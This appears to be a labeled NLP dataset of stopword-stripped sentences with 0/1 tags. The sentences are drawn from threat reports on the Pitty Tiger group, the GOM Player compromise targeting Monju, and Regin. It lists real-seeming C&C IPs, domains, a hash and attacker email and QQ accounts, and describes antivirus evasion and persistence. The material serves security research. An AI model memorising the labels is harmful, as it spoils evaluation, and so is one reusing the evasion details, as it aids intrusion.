Some examples avstore.com.tw sophos.skypetm.com.tw symantecs.com.tw trendmicro.org.tw etc	0
The registration information domain since 2013-06-04 This information used register another domain skypetm.com.tw also used Pitty Tiger group	0
Our research also led us discovery four different malware families connected subdomains avstore.com.tw This domain shown two different WHOIS entries time The recent registration information also used avstore.com.tw	0
Six malware families identified communicating subdomains skypetm.com.tw Avstore.com.tw skypetm.com.tw 4 malware families common communicating subdomains domains Some domains registered group old	1
There increase registrations 2010	0
All e-mail addresses used connected Pitty Tiger group	0
Mapping victims targeted campaign easy task	0
We found Pitty Tiger group active one particular private company defense industry one academic network government yet think done used proxy group 's operations	0
We also found connections companies c & c servers yet find evidence real victims	0
These alleged victims work different sectors located mostly European countries	0
It might surprising see company specialized web development yet built websites interesting potential targets	0
We suspect Pitty Tiger use compromise spear phish companies commercial relation web development company	1
We mention access three several attackers ' servers	0
Therefore suppose Pitty Tiger group could targets could confirm	0
We also found lot vulnerability scanners launched attackers different targets yet sign compromise	1
During course investigations discovered RAR archive attacker 's server containing 5 Word documents one small C source code	0
These documents belong defense company compromised	0
According name files general feel archive think extracted attackers '' show '' someone kind data could get compromise particular target	1
The documents still exhibiting comments various users showing ongoing work old documents	0
Interestingly enough saw part documents appear Virus-Total additional '' gift '' attackers payload dropping malware	1
There two options think  Someone company targeted document	1
 Someone another company targeted document	1
This company could partner competitor	0
Since unable determine intended use specific document suppose could used provide commercial advantages competitors company used foreign state	0
During investigation found interesting information Pitty Tiger group	0
After analyzing various collected elements tried draw portrait particular threat	0
We able get RDP connections logs one c & c server These connections either VPS dynamic IP addresses mostly China	0
A computer named CHMXY-PC connected c & c via RDP IP address 58.61.40.5	1
The IP ADSL dynamic pool Gangzhou area ( Guangdong province ) A connections c & c done computer named TIEWEISHIPC IP address 27.16.139.143	1
This IP address belongs ADSL dynamic pool Wuhan area ( Hubei's provincial capital )	0
Some connections c & c originated computer named FLY-THINK several IP addresses located Fuqing ( Fujian province )	1
The IP addresses ADSL dynamic pool Most connections c & c server coming computer named 50PZ80C- 1DFDCB8 several IP addresses	1
There 11 IP addresses Chinese dynamic ADSL ranges 9 Fuqing ( Fujian province ) one Fuzhou ( Fujian 's province capital ) one Nanchang ( Jiangxi 's province capital )	0
The last one came VPS instance located Los Angeles ( California USA ) purchased China based VPS provider XeVPS belong AS38197 ( Sun Network Hong Kong Limited )	0
The two computers FLY-THINK 50PZ80C-1DFDCB8 used distinct IP addresses connect c & c yet IP addresses come IP range We mapped RDP connections graphical view We found member group attackers used tools system testing purposes	1
This information still available got access c & c server	0
He launched tests CT RAT exposed earlier Here see user '' Toot '' machine named '' toot-2a601225a8 '' logging CT RAT executing commands	1
The c & c IP address 198.100.113.27 seen	0
Other log files showed '' Toot '' using virtual machines tests	0
We also see system Microsoft Windows XP SP3	0
The '' P '' field language ID	0
1028 means '' Chinese traditional ''	0
We also seen tests run '' toot '' language ID 2052 '' Chinese simplified ''	0
The '' M '' field probably used versioning	0
It hardcoded string binary	0
After tests could see real connections victim using RAT	1
Here follow-up commands launched bot controller standard command-line shell The attacker goes like using tools ends communication RAT computer	0
Please note point attacker least privileges local administrator since allowed write content system32 folder Windows XP system	1
He could also gain credentials sensitive e-mail account	1
In addition information already shown saw Toot connect account cloud service named '' Baidu Drive ''	0
The e-mail address linked account dyanmips @ qq.com ( QQ-ID 2589315828 )	0
We could find traces two e-mail accounts associated Toot ciscodyanmips @ qq.com ( QQ ID 204156335 ) ciscodynamips @ qq.com ( QQ ID 1878836793 )	0
We find information user '' Toot '' yet miss Chinese language capabilities	0
The controller part CT RAT/PittyTiger RAT revealed following '' '' information translated Chinese English language CT console ( compatible pittytiger ) v1.3 2013.12 Trees snow We believe translation author 's name might accurate due use automated translation tools	0
Moreover strong suspicions single individual nicknamed '' Trees snow '' rather two programmers nicknamed '' Trees '' '' Snow ''	0
'' Trees '' could also '' Cold ''	0
We noticed symbol word translated differently according context used	0
Once lack Chinese language skills	0
We identify two nicknames current campaign Automn Snow ( 秋雪 ) Cold Air Kiss ( 风吻寒 )	0
While confident people indeed developers PittyTiger CT RAT malware sure belong PittyTiger group	0
These developers might hired develop RATs	0
They might also selling PittyTiger group	0
There trace usage attacking groups believe PittyTiger RAT exclusively used group attackers	0
According indicators gathered threat activities profiling hypothesis way group conducting operations	0
We strong evidence bot operator position	0
We identify one nickname position user known TooT	0
As see nickname think TooT one person group persons	0
We also identified malware development position	0
We identified two nicknames position current campaign Automn Snow ( 秋雪 ) Cold Air Kiss ( 风吻寒 )	0
Yet unsure belong group might third party providing selling malware	0
We strong suspicion coordinator position coordinates bot operator provides logistics support ( weaponized document tools… ) reviews programmers work	0
This position could imply communication channel another manager	0
We named position 'Chen ' relation several references common Chinese name c & c WHOIS investigation materials	0
We suspicion customer relationship manager position may act interface customer Chen	0
We named position 'Lilly '	0
The c & c servers used attackers revealed lot interesting files stored various folders This quite usual arsenal group APT attackers What rare find controller part tools	1
We lucky enough get controller part Pitty Tiger CT RAT even get kind hybrid controller made CT RAT also supporting Pitty Tiger	0
We suppose CT RAT new evolution Pitty Tiger replace Pitty Tiger following months	0
The presence Chinese version '' calc.exe '' official calculator provided Microsoft Windows interesting	0
Not one indicator probable Chinese origin also indicator server probably used test base addition operational controlling infected machines different targets	1
In addition tools found interesting scripts	0
A script named ipc.bat uses file named user.txt try brute-force shared folder access The user.txt file contains thousands lines one couple one particular username one password attempt This user.txt file anonymized yet wanted give feel	1
This file 67320 lines long uses 5610 different passwords 12 users contained file	0
The user names clearly result user enumeration dedicated particular French victim	0
The passwords listed file either build several campaigns current campaign	0
A lot passwords related targeted company might previous passwords users	0
We also discovered pack files used trigger Internet Explorer vulnerability ( CVE-2014-0322 )	0
The date files namely Tope.swf index.html 2014/02/18 days revelation existing exploits wild used APT attacks	0
We know Pitty Tiger group used exploit found trace indicating	0
A lot different attackers seem used vulnerability since	0
Determining exactly behind APT campaign difficult	0
We tried extract different technical indicators together contextual elements	0
Information relating tools used attackers leveraged attribution The IP addresses used hosting c & c domains mainly located Taipei ( Taïwan ) Hong Kong City ( Hong Kong Special Administrative Region PRC ) Most RDP connections c & c infrastructure come Chinese IP ranges Fuqing ( Fujian province PRC )	1
Yet IP addresses USA Hong Kong also found ; All items listed chapter strong indicators attackers might Chinese	0
Pitty Tiger group attackers active since least 2011	0
Pitty Tiger effective mature use targeted malware use known exploits infect computers malware creation infrastructure efficiently conduct APT attacks	1
They quite unprofessional way using infrastructure launch vulnerability scanners directly c & c server also use connection personal activities ( downloading pornographic material example seen whole folder c & c server full xxx torrent links )	1
Pitty Tiger probably state-sponsored group attackers	0
The attackers lack experience financial support one would expect state-sponsored attackers	0
We suppose group opportunistic sells services probable competitors targets private sector	0
One governmental network targeted group yet evidence purpose attack	0
We suppose particular attack executed provide usable bounce group	0
The campaign studied largely focused one particular target	0
We suspect Pitty Tiger group work according opportunistic business model group might offer services third parties private sector	0
This group seems small compared APT groups	0
We leveraged several profiles could identify attackers certain extent	0
We believe group might keep working limited budgets grow extend attacking campaign capabilities	0
This list indicators provided order help people detect Pitty Tiger APT campaign	0
Context Information Security distribute Context Threat Intelligence ( CTI ) reporting Traffic Light Protocol ( TLP ) method classifying document order promote distribution sensitive information individuals organisations communities controlled trusted way based originator 's wishes	0
The various levels TLP represented following colours Sources may use TLP RED information effectively acted upon additional parties could lead impacts party 's privacy reputation operations misused	0
Recipients may share TLP RED information parties outside specific exchange meeting conversation originally disclosed	0
TLP RED information passed verbally person	0
Sources may use TLP AMBER information requires support effectively acted upon carries risks privacy reputation operations shared outside organisations involved	0
Recipients may share TLP AMBER information members organisation need know widely necessary act information	0
Sources may use TLP GREEN information useful awareness participating organisations well peers within broader community sector	0
Recipients may share TLP GREEN information peers partner organisations within sector community via publicly accessible channels publication posting publicly Internet	0
Sources may use TLP WHITE information carries minimal foreseeable risk misuse accordance applicable rules procedures public release	0
Subject standard copyright rules TLP WHITE information may distributed freely without restriction	0
On 2nd January 2014 Systems Administrator Monju fast breeder reactor facility Japan noticed suspicious connections emanating machine control room coinciding seemingly routine software update free media player	0
Among items staff training documents 40,000 emails stored machine thought harvested attacker	1
The Japanese Atomic Energy Agency investigating	0
The attack appears result attackers compromised 'GOM Player ' update server act 'watering hole ' meaning machines access site delivered malware	1
Gom Player originates South Korea parts Asia popular alternative Windows Media Player	0
It unclear whether every machine trying download update received malware whether machines fitted certain profile infected	0
Technical analysis implant compromised machine shown variant Trojan wild years continues effective	1
The 'Gh0st RAT ' used extensively attacks linked Chinese state though important remember code publicly available modified used anyone	0
The targeting Japanese nuclear facility however consistent Chinese state intelligence requirements	0
If work Chinese group feel targeting may go much Civil Nuclear sector thus interest wider Energy Sector industry whole	0
In order inform Energy Sector beyond attack compiled technical summary attack provided number Indicators Of Compromise ( IOCs ) used aid detection	0
It likely attackers would redeploy implant targets albeit delivery mechanism tailored location intended victims	0
Based open source reporting appears intrusion took place via compromise GOM Player update server ( app.gomlab.com ) attackers may gained entry via PHP-based webshell hidden within image present host since October 2011	1
The observed malicious activity relates modification file controls GOM Player updates spanning date range 27th December 2013 16th January 2014 time alterations reported manifested visitors certain IP ranges ; evidence supporting claim yet made public	1
If indeed case nature attack certainly targeted one would cover entire userbase GOM Player product victims comprising Japanese Government addition Monju nuclear facility	0
The modified file redirected GOM Player update process another compromised server ( www.fudousankaitori.jp ( 203.189.101.35 ) ) file containing legitimate update malware deliver victim	1
Deployed system via compressed bundle containing official GOM Player setup binary self-extracting RAR archive containing malicious files malware consists number individual pieces	1
Upon extraction RAR archive installer component ( 0ae82fd94836815a1e8d284ccb75109d ) automatically launched alongside GOM Player update distracting victims malicious activity taking place	1
The installer component referred author 'miansha ' according East Asia Cyber Threat Intelligence Researcher likely Miǎnshā ( 免杀 ) phrase commonly used People 's Republic China ( PRC ) hackers mean 'anti Antivirus detection ' 'Antivirus avoidance ' ; Symantec named detection code 'Backdoor.Miancha ' Miǎnchá ( 免查 likely shorthand 免杀查 ) similarly means 'Antivirus avoidance '	1
The installer responsible malware persistence mechanism adding entries registry following locations depending Windows Version The installer also determine system architecture ( 32- 64-bit ) deobfuscate relevant loader DLL path 'C \Windows\temp\install.ocx ' ensuring malware launched system start-up	1
Oddly file padded null bytes resulting 25 megabyte file	0
The main implant code stored files named instructions.pdf instructions64.pdf ; PDF documents instead DLLs obfuscated one-byte XOR 0x14 similar malware loader DLLs	1
The loader referred malware author 壳 ( shell ) reads deobfuscates main implant code communicates attacker-controlled server testqweasd.tk ( 211.43.220.89 ) TCP port 443	1
The main implant code referred 白加黑 ( 'Black White ' ) term used PRC hacking community denote act Antivirus avoidance loading malicious 'black ' code via non-malicious trusted 'white ' code	1
This practice recently illustrated deployment PlugX trojan utilising DLL load order hijacking alongside signed ( trusted ) executable	1
Analysis malware revealed variant Gh0st RAT often used Chinese actors ( including state-motivated directly state-sponsored )	0
This specific variant shows similarities used VOHO campaign Gh0st RAT spread via watering hole attacks utilising vulnerable websites belonging financial services technology companies	1
Specifically initial five bytes communications ( often used denote campaign victim ) 'HTTPS ' amended original 'Gh0st ' ; traffic produced VOHO Gh0st variant	0
In addition delivering system-specific details back attacker Gh0st RAT provides capability deploy additional malware enabling harvesting sensitive data enabling propagation throughout infected network	1
In world malware threats rare examples truly considered groundbreaking almost peerless	0
What seen Regin class malware	0
Regin extremely complex piece software customized wide range different capabilities deployed depending target	1
It built framework designed sustain long-term intelligence-gathering operations remaining radar	1
It goes extraordinary lengths conceal activities compromised computers	1
Its stealth combines many advanced techniques ever seen use	0
The main purpose Regin intelligence gathering implicated data collection operations government organizations infrastructure operators businesses academics private individuals	1
The level sophistication complexity Regin suggests development threat could taken well-resourced teams developers many months years develop maintain	0
Regin multi-staged modular threat meaning number components depending others perform attack operations	0
This modular approach gives flexibility threat operators load custom features tailored individual targets required	0
Some custom payloads advanced exhibit high degree expertise specialist sectors	0
The modular design also makes analysis threat difficult components must available order fully understand	1
This modular approach seen sophisticated malware families Flamer Weevil ( The Mask ) multi-stage loading architecture similar seen Duqu/Stuxnet family threats	0
Regin different commonly referred '' traditional '' advanced persistent threats ( APTs ) techniques ultimate purpose	0
APTs typically seek specific information usually intellectual property	1
Regin 's purpose different	0
It used collection data continuous monitoring targeted organizations individuals	1
This report provides technical analysis Regin based number identified samples components	0
This analysis illustrates Regin 's architecture many payloads disposal	0
Regin multi-purpose data collection tool dates back several years	0
Symantec first began looking threat fall 2013	0
Multiple versions Regin found wild targeting several corporations institutions academics individuals	0
Regin wide range standard capabilities particularly around monitoring targets stealing data	1
It also ability load custom features tailored individual targets	0
Some Regin 's custom payloads point high level specialist knowledge particular sectors telecoms infrastructure software part developers	0
Regin capable installing large number additional payloads highly customized targeted computer	1
The threat 's standard capabilities include several remote access Trojan ( RAT ) features capturing screenshots taking control mouse 's point-and-click functions	1
Regin also configured steal passwords monitor network traffic gather information processes memory utilization	1
It also scan deleted files infected computer retrieve	1
More advanced payload modules designed specific goals mind also found investigations	0
For example one module designed monitor network traffic Microsoft Internet Information Services ( IIS ) web servers another designed collect administration traffic mobile telephony base station controllers another created specifically parsing mail Exchange databases	1
Regin goes lengths hide data stealing	1
Valuable target data often written disk	1
In cases Symantec able retrieve threat samples files containing stolen data	0
Symantec aware two distinct versions Regin	0
Version 1.0 appears used least 2008 2011	0
Version 2.0 used 2013 onwards though may possibly used earlier	0
Version 1.0 appears abruptly withdrawn circulation 2011	0
Version 1.0 samples found date seem improperly removed longer accessible attackers removal	0
This report based primarily analysis Regin version 1.0	0
We also touch version 2.0 recovered 64-bit files	0
Symantec assigned version identifiers two versions acquired	0
Regin likely two versions	0
There may versions prior 1.0 versions 1.0 2.0	0
The Regin operators appear focus specific industry sector	0
Regin infections observed variety organizations including private companies government entities research institutes	0
Infections also geographically diverse identified mainly 10 different regions	0
The infection vector varies among targets	0
A reproducible infection vector unconfirmed time writing	0
Targets may tricked visiting spoofed versions well- known websites threat may installed web browser exploiting application	1
On one computer log files show Regin originated Yahoo Instant Messenger unconfirmed exploit	1
Regin six-stage architecture	0
The initial stages involve installation configuration threat 's internal services	1
